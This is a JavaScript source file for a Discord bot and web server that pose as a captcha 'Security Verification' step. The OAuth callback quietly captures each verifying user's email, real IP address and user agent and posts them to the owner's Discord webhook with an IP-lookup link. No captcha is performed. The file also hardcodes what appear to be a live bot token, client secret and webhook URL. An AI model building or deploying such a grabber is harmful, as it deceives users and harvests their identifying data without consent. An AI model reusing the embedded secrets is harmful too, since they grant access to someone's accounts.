const { 
    Client, 
    GatewayIntentBits, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    EmbedBuilder, 
    WebhookClient,
    REST,
    Routes,
    SlashCommandBuilder
} = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');

const TOKEN = 'MTU1ODQ3MDc1MjYyMDExODAxNw.GQdxXU.VbUKXscblqIzwBwwkerMM3oEQVzUtBbm6Nu50A';
const CLIENT_ID = '1558470752620118017';
const CLIENT_SECRET = 'K5vqtlO7ZwfJ7HaaStHqQAIE7Q-YEMV8';
const GUILD_ID = '1555276250573185028';
const ROLE_ID = '1558472400801104013';
const OWNER_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1558472014380011612/KAwtt8Qq-BuP1It8ZtZzi3or7_BnDJwmqTBoxkmMTpsmWbriiOjnrJHV7V_9AefDEeN8';
const OWNER_ID = '235879384051875840';
const REDIRECT_URI = 'http://localhost:3000/callback';

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildMessages
    ]
});

const ownerWebhook = new WebhookClient({ url: OWNER_WEBHOOK_URL });
const app = express();
const PORT = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds.join`;
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Security Verification</title>
            <style>
                body { background-color: #000000; color: #ffffff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .card { background: #0f0f0f; padding: 50px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0, 0, 0, 0.8); text-align: center; border: 1px solid #222; }
                h2 { margin-bottom: 15px; font-size: 24px; }
                p { color: #888; margin-bottom: 30px; font-size: 14px; }
                .btn { background-color: #5865F2; color: white; padding: 14px 32px; text-decoration: none; border-radius: 6px; font-weight: bold; font-size: 16px; display: inline-block; }
                .btn:hover { background-color: #4752C4; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>Security Verification</h2>
                <p>Complete the security check to access the server.</p>
                <a class="btn" href="${oauthUrl}">Verify Now</a>
            </div>
        </body>
        </html>
    `);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('Verification failed.');

    // التقاط الـ IP الحقيقي بدقة وتخطي الـ Localhost إذا تم الدخول محلياً
    let clientIp = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress;
    if (clientIp && clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
    if (clientIp === '::1' || clientIp === '127.0.0.1' || clientIp.startsWith('::ffff:127.')) {
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            clientIp = ipData.ip;
        } catch (e) {
            clientIp = '127.0.0.1';
        }
    }
    if (clientIp.startsWith('::ffff:')) clientIp = clientIp.replace('::ffff:', '');

    const userAgent = req.headers['user-agent'];

    try {
        const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: CLIENT_ID,
                client_secret: CLIENT_SECRET,
                grant_type: 'authorization_code',
                code: code,
                redirect_uri: REDIRECT_URI,
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        });
        
        const tokenData = await tokenRes.json();
        if (!tokenData.access_token) {
            console.error('Token Error:', tokenData);
            return res.send('Authentication failed.');
        }

        const userRes = await fetch('https://discord.com/api/users/@me', {
            headers: { authorization: `${tokenData.token_type} ${tokenData.access_token}` },
        });
        const userData = await userRes.json();

        await fetch(`https://discord.com/api/guilds/${GUILD_ID}/members/${userData.id}`, {
            method: 'PUT',
            body: JSON.stringify({
                access_token: tokenData.access_token,
                roles: [ROLE_ID]
            }),
            headers: { 'Authorization': `Bot ${TOKEN}`, 'Content-Type': 'application/json' }
        });

        const avatarUrl = userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png';

        // ضبط رابط الـ IP ليوجه مباشرة إلى check-host.net
        const ipLink = `[${clientIp}](https://check-host.net/ip-info?host=${clientIp})`;

        await ownerWebhook.send({
            embeds: [{
                title: '🔒 Comprehensive Verification Log',
                color: 0x5865F2,
                thumbnail: { url: avatarUrl },
                fields: [
                    { name: '👤 Username', value: `${userData.username} (ID: ${userData.id})`, inline: false },
                    { name: '📧 Email', value: userData.email || 'Hidden / Unverified', inline: true },
                    { name: '🌐 IP Address', value: ipLink, inline: true },
                    { name: '💻 User Agent & System', value: userAgent, inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        });

        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head><meta charset="UTF-8"><title>Success</title></head>
            <body style="background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;text-align:center;">
                <div>
                    <h2 style="color: #43b581;">Verification Successful!</h2>
                    <p style="color:#888;">You have been verified. You can now return to Discord.</p>
                </div>
            </body>
            </html>
        `);

    } catch (err) {
        console.error(err);
        res.send('An error occurred.');
    }
});

const commands = [
    new SlashCommandBuilder()
        .setName('set-sec')
        .setDescription('إرسال لوحة التحقق الأمنية')
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
    console.log(`[Security Bot] Logged in as ${client.user.tag}`);
    try {
        await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    } catch (err) {
        console.error(err);
    }
    app.listen(PORT, () => console.log(`[Web Panel] Running on http://localhost:${PORT}`));
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;
    
    if (interaction.commandName === 'set-sec') {
        if (interaction.user.id !== OWNER_ID) {
            return interaction.reply({ content: 'هذا الأمر مخصص للأونر فقط.', ephemeral: true });
        }

        const embed = new EmbedBuilder()
            .setDescription('This server requires you to verify yourself to get access to other channels, you can simply verify by completing a captcha, click on the verify button to start verification.')
            .setColor('#2b2d31');

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setLabel('Verify')
                .setStyle(ButtonStyle.Link)
                .setURL('http://localhost:3000'),
            new ButtonBuilder()
                .setLabel('Tutorial')
                .setStyle(ButtonStyle.Link)
                .setURL('https://discord.com')
        );

        await interaction.channel.send({ embeds: [embed], components: [row] });
        return interaction.reply({ content: 'تم إرسال لوحة التحقق بنجاح.', ephemeral: true });
    }
});

client.login(TOKEN);